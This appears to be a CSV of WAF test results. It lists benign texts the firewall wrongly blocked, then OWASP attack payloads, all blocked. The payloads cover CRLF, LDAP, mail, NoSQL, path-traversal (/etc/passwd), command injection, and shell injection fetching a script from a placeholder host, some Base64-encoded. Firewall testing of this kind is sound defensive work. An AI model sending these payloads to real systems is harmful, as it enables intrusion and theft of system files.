Payload,Check Status,Response Code,Placeholder,Encoder,Set,Case,Test Result
JavaScript%3A+Basics+of+JavaScript+Language,blocked,403,URLParam,URL,false-pos,texts,failed
ls+300+lexus,blocked,403,URLParam,URL,false-pos,texts,failed
ls+300+lexus,blocked,403,HTMLForm,URL,false-pos,texts,failed
ls+300+lexus,blocked,403,HTMLMultipartForm,URL,false-pos,texts,failed
nc+8000+controller,blocked,403,URLParam,URL,false-pos,texts,failed
I+would+like+to+be+notified+when+the+ASIN%3A+B07JJS7WY7+is+back+in+stock.,blocked,403,URLParam,URL,false-pos,texts,failed
%3DCan+I+please+adjust_campaign%3Asign%3F,blocked,403,URLParam,URL,false-pos,texts,failed
%7DI+would+like+to+request+the+%2Fcc+serviceCode+with+the+parameter%3A+serviceCode%7C%7B%7D,blocked,403,URLParam,URL,false-pos,texts,failed
If+the+subject+parameter+is+greater+than+0%2C+then+return+a+list+of+all+articles+with+that+subject.,blocked,403,URLParam,URL,false-pos,texts,failed
I+would+like+to+request+a+random+number+between+1+and+10%2C+please.,blocked,403,URLParam,URL,false-pos,texts,failed
I+would+like+to+request+the+bin+with+app_id%3A+%28%5D,blocked,403,URLParam,URL,false-pos,texts,failed
%29I+would+like+to+request+information+about+the+address%3A+%28%23%29saddr+for+the+next+minute.,blocked,403,URLParam,URL,false-pos,texts,failed
I+would+like+to+keep-alive+my+connection+and+have+the+full_text+of+the+article%2C+please.,blocked,403,URLParam,URL,false-pos,texts,failed
MKCALENDAR+cursor%3AI+would+like+to+create+a+new+calendar+called+%22cursor%22+please.,blocked,403,URLParam,URL,false-pos,texts,failed
lhttps%3A%2F%2Fwww.instagram.com%2Fp%2FB_uHgI7lY0Z%2F%3Figshid%3D1m7xkk7a9v6z4%26utm_source%3Dig_web_copy_linkCan+I+please+get+the+id+for+the+user+that+I+am+trying+to+follow%3F,blocked,403,URLParam,URL,false-pos,texts,failed
DELETE+75oBC%24,blocked,403,HTMLMultipartForm,URL,false-pos,texts,failed
DELETE+75oBC%24,blocked,403,URLParam,URL,false-pos,texts,failed
DELETE+75oBC%24,blocked,403,HTMLForm,URL,false-pos,texts,failed
The+parameter+5+is%26%7C.,blocked,403,URLParam,URL,false-pos,texts,failed
and+%3DIS%3DC5HF95_%3D,blocked,403,URLParam,URL,false-pos,texts,failed
and+%26IN%3Dcolor%26%3D,blocked,403,URLParam,URL,false-pos,texts,failed
I+would+like+to+request+information+about+the+idv_msdb+database.,blocked,403,URLParam,URL,false-pos,texts,failed
I+would+like+to+request+the+local+version+of+the+website+in+French%2C+so+I+will+include+the+parameter+%22hl%3Dfr%22,blocked,403,URLParam,URL,false-pos,texts,failed
The+standard+for+the+%3C%24+tag+is+to+enclose+text+or+code+that+should+be+interpreted+as+a+dollar+amount.,blocked,403,URLParam,URL,false-pos,texts,failed
%2CI+would+like+to+request+information+about+the+shadow+EXFFJT.,blocked,403,URLParam,URL,false-pos,texts,failed
I+setted+the+COOKIE+value+to+%3A+expandGeoJsonFeatures%3Dtrue%3B,blocked,403,URLParam,URL,false-pos,texts,failed
I+would+like+to+see+a+list+of+drivers+sorted+in+reverse+order.,blocked,403,URLParam,URL,false-pos,texts,failed
_SELECT+all+the+rows+of+fromDate+%3D+%40-_,blocked,403,URLParam,URL,false-pos,texts,failed
I+would+like+to+search+for+the+string+%22%25t%22+please.,blocked,403,URLParam,URL,false-pos,texts,failed
_I+would+like+to+see+the+runtime+for+the+payload%2C+please.,blocked,403,URLParam,URL,false-pos,texts,failed
and+%3EI+would+like+to+see+all+of+the+items+that+are+type+%3Center+type+here%3E.,blocked,403,URLParam,URL,false-pos,texts,failed
%5BHost%3A+type%3A+%7B%5B,blocked,403,URLParam,URL,false-pos,texts,failed
%0a%0dSet-cookie:crlf=injection,blocked,403,URLPath,Plain,owasp,crlf,passed
%0d%0aSet-Cookie:crlf=injection,blocked,403,URLPath,Plain,owasp,crlf,passed
%25%30%41Set-cookie:crlf=injection,blocked,403,URLPath,Plain,owasp,crlf,passed
%25%30%44%25%30%41Set-cookie:crlf=injection,blocked,403,URLPath,Plain,owasp,crlf,passed
%25%30%41%25%30%44Set-cookie:crlf=injection,blocked,403,URLPath,Plain,owasp,crlf,passed
%e5%98%8dSet-cookie%3acrlf%3dinjection,blocked,403,URLPath,Plain,owasp,crlf,passed
KCYodWlkPWFkbWluKSghKCYoMT0wKSh1c2VyUGFzc3dvcmQ9cSkpKSk,blocked,403,URLParam,Base64Flat,owasp,ldap-injection,passed
KCYodWlkPWFkbWluKSghKCYoMT0wKSh1c2VyUGFzc3dvcmQ9cSkpKSk,blocked,403,HTMLForm,Base64Flat,owasp,ldap-injection,passed
%25%0a%0aSet-cookie:crlf=injection,blocked,403,URLPath,Plain,owasp,crlf,passed
KCYodWlkPWFkbWluKSghKCYoMT0wKSh1c2VyUGFzc3dvcmQ9cSkpKSk,blocked,403,HTMLMultipartForm,Base64Flat,owasp,ldap-injection,passed
KCYodWlkPWFkbWluKSghKCYoMT0wKSh1c2VyUGFzc3dvcmQ9cSkpKSk,blocked,403,JSONRequest,Base64Flat,owasp,ldap-injection,passed
%28%26%28uid%3Dadmin%29%28%21%28%26%281%3D0%29%28userPassword%3Dq%29%29%29%29,blocked,403,URLParam,URL,owasp,ldap-injection,passed
%28%26%28uid%3Dadmin%29%28%21%28%26%281%3D0%29%28userPassword%3Dq%29%29%29%29,blocked,403,HTMLForm,URL,owasp,ldap-injection,passed
%28%26%28uid%3Dadmin%29%28%21%28%26%281%3D0%29%28userPassword%3Dq%29%29%29%29,blocked,403,JSONRequest,URL,owasp,ldap-injection,passed
%28%26%28uid%3Dadmin%29%28%21%28%26%281%3D0%29%28userPassword%3Dq%29%29%29%29,blocked,403,HTMLMultipartForm,URL,owasp,ldap-injection,passed
Kih8KG9iamVjdGNsYXNzPSopKQ,blocked,403,URLParam,Base64Flat,owasp,ldap-injection,passed
Kih8KG9iamVjdGNsYXNzPSopKQ,blocked,403,HTMLForm,Base64Flat,owasp,ldap-injection,passed
Kih8KG9iamVjdGNsYXNzPSopKQ,blocked,403,HTMLMultipartForm,Base64Flat,owasp,ldap-injection,passed
%2A%28%7C%28objectclass%3D%2A%29%29,blocked,403,HTMLForm,URL,owasp,ldap-injection,passed
%2A%28%7C%28objectclass%3D%2A%29%29,blocked,403,URLParam,URL,owasp,ldap-injection,passed
Kih8KG9iamVjdGNsYXNzPSopKQ,blocked,403,JSONRequest,Base64Flat,owasp,ldap-injection,passed
%2A%28%7C%28objectclass%3D%2A%29%29,blocked,403,HTMLMultipartForm,URL,owasp,ldap-injection,passed
dXNlclBhc3N3b3JkOjIuNS4xMy4xODo9MTIz,blocked,403,URLParam,Base64Flat,owasp,ldap-injection,passed
dXNlclBhc3N3b3JkOjIuNS4xMy4xODo9MTIz,blocked,403,JSONRequest,Base64Flat,owasp,ldap-injection,passed
%2A%28%7C%28objectclass%3D%2A%29%29,blocked,403,JSONRequest,URL,owasp,ldap-injection,passed
dXNlclBhc3N3b3JkOjIuNS4xMy4xODo9MTIz,blocked,403,HTMLForm,Base64Flat,owasp,ldap-injection,passed
dXNlclBhc3N3b3JkOjIuNS4xMy4xODo9MTIz,blocked,403,HTMLMultipartForm,Base64Flat,owasp,ldap-injection,passed
userPassword%3A2.5.13.18%3A%3D123,blocked,403,HTMLForm,URL,owasp,ldap-injection,passed
userPassword%3A2.5.13.18%3A%3D123,blocked,403,URLParam,URL,owasp,ldap-injection,passed
DQpWMTAwIENBUEFCSUxJVFkNClYxMDEgRkVUQ0ggNDc5MQ,blocked,403,URLPath,Base64Flat,owasp,mail-injection,passed
userPassword%3A2.5.13.18%3A%3D123,blocked,403,HTMLMultipartForm,URL,owasp,ldap-injection,passed
userPassword%3A2.5.13.18%3A%3D123,blocked,403,JSONRequest,URL,owasp,ldap-injection,passed
DQpWMTAwIENBUEFCSUxJVFkNClYxMDEgRkVUQ0ggNDc5MQ,blocked,403,URLParam,Base64Flat,owasp,mail-injection,passed
DQpWMTAwIENBUEFCSUxJVFkNClYxMDEgRkVUQ0ggNDc5MQ,blocked,403,HTMLMultipartForm,Base64Flat,owasp,mail-injection,passed
%0D%0AV100+CAPABILITY%0D%0AV101+FETCH+4791,blocked,403,URLPath,URL,owasp,mail-injection,passed
DQpWMTAwIENBUEFCSUxJVFkNClYxMDEgRkVUQ0ggNDc5MQ,blocked,403,HTMLForm,Base64Flat,owasp,mail-injection,passed
%0D%0AV100+CAPABILITY%0D%0AV101+FETCH+4791,blocked,403,HTMLForm,URL,owasp,mail-injection,passed
%0D%0AV100+CAPABILITY%0D%0AV101+FETCH+4791,blocked,403,URLParam,URL,owasp,mail-injection,passed
%0D%0AV100+CAPABILITY%0D%0AV101+FETCH+4791,blocked,403,HTMLMultipartForm,URL,owasp,mail-injection,passed
DQpRVUlUDQo,blocked,403,URLPath,Base64Flat,owasp,mail-injection,passed
%0D%0AQUIT%0D%0A,blocked,403,URLPath,URL,owasp,mail-injection,passed
ClJDUFQgVE86IHRlc3RAZXZpbC5jb20K,blocked,403,URLPath,Base64Flat,owasp,mail-injection,passed
ClJDUFQgVE86IHRlc3RAZXZpbC5jb20K,blocked,403,URLParam,Base64Flat,owasp,mail-injection,passed
ClJDUFQgVE86IHRlc3RAZXZpbC5jb20K,blocked,403,HTMLMultipartForm,Base64Flat,owasp,mail-injection,passed
ClJDUFQgVE86IHRlc3RAZXZpbC5jb20K,blocked,403,HTMLForm,Base64Flat,owasp,mail-injection,passed
%0ARCPT+TO%3A+test%40evil.com%0A,blocked,403,URLPath,URL,owasp,mail-injection,passed
%0ARCPT+TO%3A+test%40evil.com%0A,blocked,403,HTMLMultipartForm,URL,owasp,mail-injection,passed
%0ARCPT+TO%3A+test%40evil.com%0A,blocked,403,HTMLForm,URL,owasp,mail-injection,passed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,blocked,403,URLPath,Base64Flat,owasp,nosql-injection,passed
%0ARCPT+TO%3A+test%40evil.com%0A,blocked,403,URLParam,URL,owasp,mail-injection,passed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,blocked,403,URLParam,Base64Flat,owasp,nosql-injection,passed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,blocked,403,HTMLMultipartForm,Base64Flat,owasp,nosql-injection,passed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,blocked,403,JSONRequest,Base64Flat,owasp,nosql-injection,passed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,blocked,403,HTMLForm,Base64Flat,owasp,nosql-injection,passed
db.injection.insert%28%7Bsuccess%3A1%7D%29%3B,blocked,403,URLPath,URL,owasp,nosql-injection,passed
db.injection.insert%28%7Bsuccess%3A1%7D%29%3B,blocked,403,URLParam,URL,owasp,nosql-injection,passed
db.injection.insert%28%7Bsuccess%3A1%7D%29%3B,blocked,403,HTMLForm,URL,owasp,nosql-injection,passed
db.injection.insert%28%7Bsuccess%3A1%7D%29%3B,blocked,403,JSONRequest,URL,owasp,nosql-injection,passed
db.injection.insert%28%7Bsuccess%3A1%7D%29%3B,blocked,403,HTMLMultipartForm,URL,owasp,nosql-injection,passed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,blocked,403,URLPath,Base64Flat,owasp,nosql-injection,passed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,blocked,403,HTMLMultipartForm,Base64Flat,owasp,nosql-injection,passed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,blocked,403,HTMLForm,Base64Flat,owasp,nosql-injection,passed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,blocked,403,URLParam,Base64Flat,owasp,nosql-injection,passed
true%2C+%24where%3A+%2799+%3D%3D+88%27,blocked,403,URLPath,URL,owasp,nosql-injection,passed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,blocked,403,JSONRequest,Base64Flat,owasp,nosql-injection,passed
true%2C+%24where%3A+%2799+%3D%3D+88%27,blocked,403,URLParam,URL,owasp,nosql-injection,passed
true%2C+%24where%3A+%2799+%3D%3D+88%27,blocked,403,HTMLForm,URL,owasp,nosql-injection,passed
true%2C+%24where%3A+%2799+%3D%3D+88%27,blocked,403,HTMLMultipartForm,URL,owasp,nosql-injection,passed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,blocked,403,URLPath,Base64Flat,owasp,nosql-injection,passed
true%2C+%24where%3A+%2799+%3D%3D+88%27,blocked,403,JSONRequest,URL,owasp,nosql-injection,passed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,blocked,403,URLParam,Base64Flat,owasp,nosql-injection,passed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,blocked,403,HTMLForm,Base64Flat,owasp,nosql-injection,passed
%27%2C+%24or%3A+%5B+%7B%7D%2C+%7B+%27order%27%3A%27order,blocked,403,URLPath,URL,owasp,nosql-injection,passed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,blocked,403,JSONRequest,Base64Flat,owasp,nosql-injection,passed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,blocked,403,HTMLMultipartForm,Base64Flat,owasp,nosql-injection,passed
%27%2C+%24or%3A+%5B+%7B%7D%2C+%7B+%27order%27%3A%27order,blocked,403,HTMLForm,URL,owasp,nosql-injection,passed
%27%2C+%24or%3A+%5B+%7B%7D%2C+%7B+%27order%27%3A%27order,blocked,403,URLParam,URL,owasp,nosql-injection,passed
%27%2C+%24or%3A+%5B+%7B%7D%2C+%7B+%27order%27%3A%27order,blocked,403,JSONRequest,URL,owasp,nosql-injection,passed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,blocked,403,URLPath,Base64Flat,owasp,nosql-injection,passed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,blocked,403,URLParam,Base64Flat,owasp,nosql-injection,passed
%27%2C+%24or%3A+%5B+%7B%7D%2C+%7B+%27order%27%3A%27order,blocked,403,HTMLMultipartForm,URL,owasp,nosql-injection,passed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,blocked,403,HTMLForm,Base64Flat,owasp,nosql-injection,passed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,blocked,403,HTMLMultipartForm,Base64Flat,owasp,nosql-injection,passed
%3Bvar+date+%3D+new+Date%28%29%3B+do%7BcurDate+%3D+new+Date%28%29%3B%7Dwhile%28curDate-date,blocked,403,URLParam,URL,owasp,nosql-injection,passed
%3Bvar+date+%3D+new+Date%28%29%3B+do%7BcurDate+%3D+new+Date%28%29%3B%7Dwhile%28curDate-date,blocked,403,URLPath,URL,owasp,nosql-injection,passed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,blocked,403,JSONRequest,Base64Flat,owasp,nosql-injection,passed
%3Bvar+date+%3D+new+Date%28%29%3B+do%7BcurDate+%3D+new+Date%28%29%3B%7Dwhile%28curDate-date,blocked,403,HTMLForm,URL,owasp,nosql-injection,passed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,blocked,403,URLParam,Base64Flat,owasp,nosql-injection,passed
%3Bvar+date+%3D+new+Date%28%29%3B+do%7BcurDate+%3D+new+Date%28%29%3B%7Dwhile%28curDate-date,blocked,403,JSONRequest,URL,owasp,nosql-injection,passed
%3Bvar+date+%3D+new+Date%28%29%3B+do%7BcurDate+%3D+new+Date%28%29%3B%7Dwhile%28curDate-date,blocked,403,HTMLMultipartForm,URL,owasp,nosql-injection,passed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,blocked,403,URLPath,Base64Flat,owasp,nosql-injection,passed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,blocked,403,HTMLForm,Base64Flat,owasp,nosql-injection,passed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,blocked,403,HTMLMultipartForm,Base64Flat,owasp,nosql-injection,passed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,blocked,403,JSONRequest,Base64Flat,owasp,nosql-injection,passed
0%3Bvar+date%3Dnew+Date%28%29%3B+do%7BcurDate+%3D+new+Date%28%29%3B%7Dwhile%28curDate-date%3C10000%29,blocked,403,URLParam,URL,owasp,nosql-injection,passed
0%3Bvar+date%3Dnew+Date%28%29%3B+do%7BcurDate+%3D+new+Date%28%29%3B%7Dwhile%28curDate-date%3C10000%29,blocked,403,HTMLForm,URL,owasp,nosql-injection,passed
0%3Bvar+date%3Dnew+Date%28%29%3B+do%7BcurDate+%3D+new+Date%28%29%3B%7Dwhile%28curDate-date%3C10000%29,blocked,403,URLPath,URL,owasp,nosql-injection,passed
0%3Bvar+date%3Dnew+Date%28%29%3B+do%7BcurDate+%3D+new+Date%28%29%3B%7Dwhile%28curDate-date%3C10000%29,blocked,403,HTMLMultipartForm,URL,owasp,nosql-injection,passed
0%3Bvar+date%3Dnew+Date%28%29%3B+do%7BcurDate+%3D+new+Date%28%29%3B%7Dwhile%28curDate-date%3C10000%29,blocked,403,JSONRequest,URL,owasp,nosql-injection,passed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,blocked,403,HTMLForm,Base64Flat,owasp,path-traversal,passed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,blocked,403,URLPath,Base64Flat,owasp,path-traversal,passed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,blocked,403,URLParam,Base64Flat,owasp,path-traversal,passed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,blocked,403,HTMLMultipartForm,Base64Flat,owasp,path-traversal,passed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,blocked,403,JSONRequest,Base64Flat,owasp,path-traversal,passed
%2Fstatic%2Fimg%2F..%2F..%2Fetc%2Fpasswd,blocked,403,URLParam,URL,owasp,path-traversal,passed
%2Fstatic%2Fimg%2F..%2F..%2Fetc%2Fpasswd,blocked,403,HTMLForm,URL,owasp,path-traversal,passed
%2Fstatic%2Fimg%2F..%2F..%2Fetc%2Fpasswd,blocked,403,URLPath,URL,owasp,path-traversal,passed
%2Fstatic%2Fimg%2F..%2F..%2Fetc%2Fpasswd,blocked,403,HTMLMultipartForm,URL,owasp,path-traversal,passed
%2Fstatic%2Fimg%2F..%2F..%2Fetc%2Fpasswd,blocked,403,JSONRequest,URL,owasp,path-traversal,passed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,blocked,403,URLPath,Base64Flat,owasp,path-traversal,passed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,blocked,403,URLParam,Base64Flat,owasp,path-traversal,passed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,blocked,403,HTMLMultipartForm,Base64Flat,owasp,path-traversal,passed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,blocked,403,HTMLForm,Base64Flat,owasp,path-traversal,passed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,blocked,403,JSONRequest,Base64Flat,owasp,path-traversal,passed
%5C%5C%3A%3A1%5Cc%24%5Cusers%5Cdefault%5Cntuser.dat,blocked,403,URLPath,URL,owasp,path-traversal,passed
%5C%5C%3A%3A1%5Cc%24%5Cusers%5Cdefault%5Cntuser.dat,blocked,403,URLParam,URL,owasp,path-traversal,passed
ax--exec%3D%60id%60--remote%3Dorigin,blocked,403,JSONRequest,URL,owasp,rce,passed
%5C%5C%3A%3A1%5Cc%24%5Cusers%5Cdefault%5Cntuser.dat,blocked,403,HTMLMultipartForm,URL,owasp,path-traversal,passed
ax--exec%3D%60id%60--remote%3Dorigin,blocked,403,URLPath,URL,owasp,rce,passed
%5C%5C%3A%3A1%5Cc%24%5Cusers%5Cdefault%5Cntuser.dat,blocked,403,JSONRequest,URL,owasp,path-traversal,passed
%5C%5C%3A%3A1%5Cc%24%5Cusers%5Cdefault%5Cntuser.dat,blocked,403,HTMLForm,URL,owasp,path-traversal,passed
ax--exec%3D%60id%60--remote%3Dorigin,blocked,403,Header,URL,owasp,rce,passed
%3B+cat+%2Fet%27c%2Fpa%27ss%27wd,blocked,403,URLPath,URL,owasp,rce,passed
ax--exec=`id`--remote=origin,blocked,403,JSONRequest,Plain,owasp,rce,passed
ax--exec=`id`--remote=origin,blocked,403,URLPath,Plain,owasp,rce,passed
ax--exec=`id`--remote=origin,blocked,403,Header,Plain,owasp,rce,passed
%3B+cat+%2Fet%27c%2Fpa%27ss%27wd,blocked,403,Header,URL,owasp,rce,passed
%3B+cat+%2Fet%27c%2Fpa%27ss%27wd,blocked,403,JSONRequest,URL,owasp,rce,passed
; cat /et'c/pa'ss'wd,blocked,403,URLPath,Plain,owasp,rce,passed
; cat /et'c/pa'ss'wd,blocked,403,JSONRequest,Plain,owasp,rce,passed
; cat /et'c/pa'ss'wd,blocked,403,Header,Plain,owasp,rce,passed
cmd%3D127.0.0.1+%26%26+ls+%2Fetc,blocked,403,URLPath,URL,owasp,rce,passed
cmd%3D127.0.0.1+%26%26+ls+%2Fetc,blocked,403,Header,URL,owasp,rce,passed
cmd%3D127.0.0.1+%26%26+ls+%2Fetc,blocked,403,JSONRequest,URL,owasp,rce,passed
cmd=127.0.0.1 && ls /etc,blocked,403,URLPath,Plain,owasp,rce,passed
cmd=127.0.0.1 && ls /etc,blocked,403,Header,Plain,owasp,rce,passed
cmd=127.0.0.1 && ls /etc,blocked,403,JSONRequest,Plain,owasp,rce,passed
O3dnZXQgaHR0cDovL3NvbWVfaG9zdC9zaDMxMS5zaA,blocked,403,JSONRequest,Base64Flat,owasp,shell-injection,passed
O3dnZXQgaHR0cDovL3NvbWVfaG9zdC9zaDMxMS5zaA,blocked,403,URLParam,Base64Flat,owasp,shell-injection,passed
O3dnZXQgaHR0cDovL3NvbWVfaG9zdC9zaDMxMS5zaA,blocked,403,HTMLForm,Base64Flat,owasp,shell-injection,passed
O3dnZXQgaHR0cDovL3NvbWVfaG9zdC9zaDMxMS5zaA,blocked,403,HTMLMultipartForm,Base64Flat,owasp,shell-injection,passed
%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh,blocked,403,JSONRequest,URL,owasp,shell-injection,passed
%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh,blocked,403,URLParam,URL,owasp,shell-injection,passed
%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh,blocked,403,HTMLForm,URL,owasp,shell-injection,passed
%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh,blocked,403,HTMLMultipartForm,URL,owasp,shell-injection,passed
fGdldGVudCtob3N0cytzb21laG9zdC5idXJwY29sbGFib3JhdG9yLm5ldC4m,blocked,403,JSONRequest,Base64Flat,owasp,shell-injection,passed
fGdldGVudCtob3N0cytzb21laG9zdC5idXJwY29sbGFib3JhdG9yLm5ldC4m,blocked,403,URLParam,Base64Flat,owasp,shell-injection,passed
fGdldGVudCtob3N0cytzb21laG9zdC5idXJwY29sbGFib3JhdG9yLm5ldC4m,blocked,403,HTMLForm,Base64Flat,owasp,shell-injection,passed
fGdldGVudCtob3N0cytzb21laG9zdC5idXJwY29sbGFib3JhdG9yLm5ldC4m,blocked,403,HTMLMultipartForm,Base64Flat,owasp,shell-injection,passed
%7Cgetent%2Bhosts%2Bsomehost.burpcollaborator.net.%26,blocked,403,JSONRequest,URL,owasp,shell-injection,passed
%7Cgetent%2Bhosts%2Bsomehost.burpcollaborator.net.%26,blocked,403,URLParam,URL,owasp,shell-injection,passed
%7Cgetent%2Bhosts%2Bsomehost.burpcollaborator.net.%26,blocked,403,HTMLForm,URL,owasp,shell-injection,passed
%7Cgetent%2Bhosts%2Bsomehost.burpcollaborator.net.%26,blocked,403,HTMLMultipartForm,URL,owasp,shell-injection,passed
O2dldGVudCRJRlMkOWhvc3RzJElGUyQ5c29tZWhvc3QuYnVycGNvbGxhYm9yYXRvci5uZXQ7ZWNobyRJRlMkOSQoKDM0ODIqNzMwMSkpOw,blocked,403,JSONRequest,Base64Flat,owasp,shell-injection,passed
O2dldGVudCRJRlMkOWhvc3RzJElGUyQ5c29tZWhvc3QuYnVycGNvbGxhYm9yYXRvci5uZXQ7ZWNobyRJRlMkOSQoKDM0ODIqNzMwMSkpOw,blocked,403,URLParam,Base64Flat,owasp,shell-injection,passed
O2dldGVudCRJRlMkOWhvc3RzJElGUyQ5c29tZWhvc3QuYnVycGNvbGxhYm9yYXRvci5uZXQ7ZWNobyRJRlMkOSQoKDM0ODIqNzMwMSkpOw,blocked,403,HTMLForm,Base64Flat,owasp,shell-injection,passed
%3Bgetent%24IFS%249hosts%24IFS%249somehost.burpcollaborator.net%3Becho%24IFS%249%24%28%283482%2A7301%29%29%3B,blocked,403,URLParam,URL,owasp,shell-injection,passed
O2dldGVudCRJRlMkOWhvc3RzJElGUyQ5c29tZWhvc3QuYnVycGNvbGxhYm9yYXRvci5uZXQ7ZWNobyRJRlMkOSQoKDM0ODIqNzMwMSkpOw,blocked,403,HTMLMultipartForm,Base64Flat,owasp,shell-injection,passed
%3Bgetent%24IFS%249hosts%24IFS%249somehost.burpcollaborator.net%3Becho%24IFS%249%24%28%283482%2A7301%29%29%3B,blocked,403,JSONRequest,URL,owasp,shell-injection,passed
%3Bgetent%24IFS%249hosts%24IFS%249somehost.burpcollaborator.net%3Becho%24IFS%249%24%28%283482%2A7301%29%29%3B,blocked,403,HTMLForm,URL,owasp,shell-injection,passed
fCBzZXQgL2EgMzQ4Mio3MzAx,blocked,403,JSONRequest,Base64Flat,owasp,shell-injection,passed
%3Bgetent%24IFS%249hosts%24IFS%249somehost.burpcollaborator.net%3Becho%24IFS%249%24%28%283482%2A7301%29%29%3B,blocked,403,HTMLMultipartForm,URL,owasp,shell-injection,passed
fCBzZXQgL2EgMzQ4Mio3MzAx,blocked,403,HTMLForm,Base64Flat,owasp,shell-injection,passed
fCBzZXQgL2EgMzQ4Mio3MzAx,blocked,403,URLParam,Base64Flat,owasp,shell-injection,passed
%7C+set+%2Fa+3482%2A7301,blocked,403,JSONRequest,URL,owasp,shell-injection,passed
fCBzZXQgL2EgMzQ4Mio3MzAx,blocked,403,HTMLMultipartForm,Base64Flat,owasp,shell-injection,passed
